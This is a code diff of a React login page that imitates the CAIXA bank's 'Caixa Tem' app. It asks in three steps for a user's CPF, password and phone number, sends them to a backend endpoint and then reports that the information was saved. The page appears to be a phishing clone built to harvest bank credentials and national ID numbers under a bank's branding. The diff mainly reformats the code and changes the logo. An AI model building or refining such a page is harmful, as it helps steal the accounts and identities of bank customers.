@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { Card, CardContent } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -8,27 +7,25 @@ import { useForm } from "react-hook-form";
 import { Loader2, User, Lock, Phone } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import { useToast } from "@/components/ui/use-toast";
-
 interface LoginFormData {
   cpf: string;
   password: string;
   phone: string;
 }
-
 const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [step, setStep] = useState<'cpf' | 'password' | 'phone'>('cpf');
   const navigate = useNavigate();
-  const { toast } = useToast();
-
+  const {
+    toast
+  } = useToast();
   const form = useForm<LoginFormData>({
     defaultValues: {
       cpf: "",
       password: "",
-      phone: "",
-    },
+      phone: ""
+    }
   });
-
   const onSubmit = async (data: LoginFormData) => {
     try {
       if (step === 'cpf') {
@@ -39,42 +36,35 @@ const Index = () => {
         setStep('phone');
         return;
       }
-      
       setIsLoading(true);
       console.log("Form data:", data);
-      
       const response = await fetch('http://localhost:3000/api/users/login', {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json',
+          'Content-Type': 'application/json'
         },
-        body: JSON.stringify(data),
+        body: JSON.stringify(data)
       });
-
       if (!response.ok) {
         throw new Error('Erro ao salvar os dados');
       }
-
       const result = await response.json();
-
       toast({
         title: "Sucesso!",
-        description: "Suas informações foram salvas com sucesso.",
+        description: "Suas informações foram salvas com sucesso."
       });
-
       navigate('/success');
     } catch (error) {
       console.error('Erro ao salvar:', error);
       toast({
         variant: "destructive",
         title: "Erro",
-        description: "Ocorreu um erro ao salvar suas informações.",
+        description: "Ocorreu um erro ao salvar suas informações."
       });
     } finally {
       setIsLoading(false);
     }
   };
-
   const getStepTitle = () => {
     switch (step) {
       case 'cpf':
@@ -85,18 +75,12 @@ const Index = () => {
         return "Digite seu número de telefone para continuar:";
     }
   };
-
-  return (
-    <div className="min-h-screen bg-white">
+  return <div className="min-h-screen bg-white">
       {/* Header */}
       <div className="flex items-center justify-between p-4 bg-white border-b border-gray-200">
-        <button 
-          className="text-blue-500 text-lg"
-          onClick={() => {
-            if (step === 'phone') setStep('password');
-            else if (step === 'password') setStep('cpf');
-          }}
-        >
+        <button className="text-blue-500 text-lg" onClick={() => {
+        if (step === 'phone') setStep('password');else if (step === 'password') setStep('cpf');
+      }}>
           {step !== 'cpf' ? 'Voltar' : 'Cancelar'}
         </button>
         <div className="flex items-center">
@@ -113,11 +97,7 @@ const Index = () => {
       <div className="p-6">
         {/* Logo */}
         <div className="flex justify-center mb-4">
-          <img 
-            src="/lovable-uploads/ee1a9cdc-d9a5-4063-a970-435d05fec562.png" 
-            alt="CAIXA" 
-            className="w-32 mb-2"
-          />
+          <img alt="CAIXA" src="/lovable-uploads/ddc8f686-4f16-42b5-a494-4cd7290c3e5d.png" className="w-32 mb-2 object-cover" />
         </div>
         <h2 className="text-center text-blue-600 text-xl mb-8">Aplicativo Caixa Tem</h2>
 
@@ -127,94 +107,50 @@ const Index = () => {
 
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
-            {step === 'cpf' && (
-              <FormField
-                control={form.control}
-                name="cpf"
-                render={({ field }) => (
-                  <FormItem>
+            {step === 'cpf' && <FormField control={form.control} name="cpf" render={({
+            field
+          }) => <FormItem>
                     <FormControl>
                       <div className="relative">
                         <div className="absolute left-0 top-2">
                           <User className="h-6 w-6 text-gray-400" />
                         </div>
-                        <Input
-                          placeholder="CPF"
-                          type="text"
-                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
-                          disabled={isLoading}
-                          {...field}
-                        />
+                        <Input placeholder="CPF" type="text" className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2" disabled={isLoading} {...field} />
                       </div>
                     </FormControl>
-                  </FormItem>
-                )}
-              />
-            )}
+                  </FormItem>} />}
 
-            {step === 'password' && (
-              <FormField
-                control={form.control}
-                name="password"
-                render={({ field }) => (
-                  <FormItem>
+            {step === 'password' && <FormField control={form.control} name="password" render={({
+            field
+          }) => <FormItem>
                     <FormControl>
                       <div className="relative">
                         <div className="absolute left-0 top-2">
                           <Lock className="h-6 w-6 text-gray-400" />
                         </div>
-                        <Input
-                          placeholder="Senha"
-                          type="password"
-                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
-                          disabled={isLoading}
-                          {...field}
-                        />
+                        <Input placeholder="Senha" type="password" className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2" disabled={isLoading} {...field} />
                       </div>
                     </FormControl>
-                  </FormItem>
-                )}
-              />
-            )}
+                  </FormItem>} />}
 
-            {step === 'phone' && (
-              <FormField
-                control={form.control}
-                name="phone"
-                render={({ field }) => (
-                  <FormItem>
+            {step === 'phone' && <FormField control={form.control} name="phone" render={({
+            field
+          }) => <FormItem>
                     <FormControl>
                       <div className="relative">
                         <div className="absolute left-0 top-2">
                           <Phone className="h-6 w-6 text-gray-400" />
                         </div>
-                        <Input
-                          placeholder="Telefone"
-                          type="tel"
-                          className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2"
-                          disabled={isLoading}
-                          {...field}
-                        />
+                        <Input placeholder="Telefone" type="tel" className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none text-lg py-2" disabled={isLoading} {...field} />
                       </div>
                     </FormControl>
-                  </FormItem>
-                )}
-              />
-            )}
+                  </FormItem>} />}
 
-            <Button
-              type="submit"
-              className="w-full bg-orange-500 hover:bg-orange-600 text-white text-lg py-6 rounded-lg"
-              disabled={isLoading}
-            >
-              {isLoading ? (
-                <>
+            <Button type="submit" className="w-full bg-orange-500 hover:bg-orange-600 text-white text-lg py-6 rounded-lg" disabled={isLoading}>
+              {isLoading ? <>
                   <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                   Processando...
-                </>
-              ) : (
-                step === 'phone' ? "Entrar" : "Próximo"
-              )}
+                </> : step === 'phone' ? "Entrar" : "Próximo"}
             </Button>
           </form>
         </Form>
@@ -237,8 +173,6 @@ const Index = () => {
           </div>
         </div>
       </div>
-    </div>
-  );
+    </div>;
 };
-
 export default Index;
